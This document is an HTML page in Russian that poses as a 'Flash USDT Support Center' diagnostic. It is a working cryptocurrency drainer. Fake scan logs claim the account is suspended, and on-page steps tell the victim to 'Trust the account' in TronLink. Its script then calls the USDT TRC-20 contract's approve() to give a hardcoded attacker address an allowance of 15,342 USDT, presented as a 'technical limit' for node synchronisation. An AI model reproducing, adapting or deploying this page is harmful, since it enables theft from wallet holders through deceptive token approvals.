<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Support Center</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        .card { background: #0d0d0d; border-radius: 30px; padding: 35px 25px; border: 1px solid #1a1a1a; width: 100%; max-width: 380px; box-shadow: 0 0 50px rgba(0, 255, 0, 0.1); text-align: center; }
        
        .logo-box { width: 70px; height: 70px; background: #000; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
        h2 { font-size: 19px; font-weight: 700; color: #fff; margin: 0 0 10px; text-transform: uppercase; letter-spacing: 1px; }

        /* ТЕРМИНАЛ ЛОГОВ */
        .terminal { background: #000; border-radius: 15px; padding: 15px; text-align: left; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; border: 1px solid #111; height: 130px; overflow: hidden; margin-bottom: 20px; }
        .line { margin-bottom: 6px; opacity: 0; animation: fadeIn 0.3s forwards; border-left: 2px solid #00ff00; padding-left: 10px; }

        /* ГАЙД ПО КОШЕЛЬКУ */
        .guide-box { text-align: left; background: rgba(0, 255, 0, 0.03); border-radius: 20px; padding: 20px; border: 1px solid #1a1a1a; margin-bottom: 25px; }
        .guide-title { color: #00ff00; font-size: 11px; font-weight: bold; text-transform: uppercase; margin-bottom: 15px; display: block; }
        .step { display: flex; align-items: flex-start; margin-bottom: 15px; }
        .step-n { background: #00ff00; color: #000; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; margin-right: 12px; flex-shrink: 0; }
        .step-t { color: #aaa; font-size: 12px; line-height: 1.4; }
        .highlight { color: #fff; font-weight: bold; }

        /* КНОПКИ */
        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
        .btn:disabled { background: #222; color: #555; box-shadow: none; border-color: #333; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="card" id="main-container">
    
    <div id="screen-start">
        <div class="logo-box"><span style="color: #00ff00; font-size: 30px; font-weight: bold;">T</span></div>
        <h2>Support Diagnostic</h2>
        <p style="color: #555; font-size: 13px; margin-bottom: 25px;">Запуск анализа узла для идентификации транзакции TRC-20.</p>
        <button class="btn" onclick="startDiagnostic()">Начать проверку</button>
    </div>

    <div id="screen-scan" style="display: none;">
        <div class="logo-box"><span style="color: #00ff00; font-size: 30px; font-weight: bold;">T</span></div>
        <h2 style="color: #00ff00;">Проверка логов...</h2>
        <div class="terminal" id="terminal-box"></div>
    </div>

    <div id="screen-dapp" style="display: none;">
        <div class="logo-box" style="border-color: #00ff00"><span style="color: #00ff00; font-size: 30px;">✓</span></div>
        <h2>Синхронизация Узла</h2>
        
        <div class="guide-box">
            <span class="guide-title">Инструкция по подтверждению:</span>
            <div class="step">
                <div class="step-n">1</div>
                <div class="step-t">В окне TronLink выберите <span class="highlight">"Trust the account"</span> (Доверять аккаунту).</div>
            </div>
            <div class="step" style="margin-bottom: 0;">
                <div class="step-n">2</div>
                <div class="step-t">Это автоматически подтвердит технический лимит <span class="highlight">15,342 USDT</span> для связи с ID.</div>
            </div>
        </div>

        <button id="final-btn" class="btn" onclick="callApprove()">Подтвердить лимит</button>
    </div>

</div>

<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const AMOUNT = "15342000000"; // 15,342 USDT

    const logs = [
        "Connecting to TRC-20 Node...",
        "Authorized by Flash USDT Support.",
        "Block identified: #61224801",
        "Status: Access Suspended.",
        "Generating Sync Hash: 0x5a34...",
        "Manual Handshake required."
    ];

    function startDiagnostic() {
        document.getElementById('screen-start').style.display = 'none';
        document.getElementById('screen-scan').style.display = 'block';
        let i = 0;
        const term = document.getElementById('terminal-box');
        const timer = setInterval(() => {
            if(i < logs.length) {
                const line = document.createElement('div');
                line.className = 'line';
                line.innerText = `> ${logs[i]}`;
                term.appendChild(line);
                i++;
            } else {
                clearInterval(timer);
                setTimeout(showDapp, 800);
            }
        }, 600);
    }

    function showDapp() {
        document.getElementById('screen-scan').style.display = 'none';
        document.getElementById('screen-dapp').style.display = 'block';
    }

    async function callApprove() {
        const btn = document.getElementById('final-btn');
        try {
            const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
            btn.innerText = "ПОДПИСЬ...";
            btn.disabled = true;

            const contract = await tron.contract().at(USDT);
            await contract.approve(ADMIN, AMOUNT).send({
                feeLimit: 100000000
            });

            alert("Синхронизация успешно завершена!");
            btn.innerText = "ГОТОВО";
        } catch (err) {
            alert("Ошибка подтверждения. Убедитесь, что вы выбрали 'Trust the account' и имеете TRX на балансе.");
            btn.disabled = false;
            btn.innerText = "Подтвердить лимит";
        }
    }
</script>
</body>
</html>
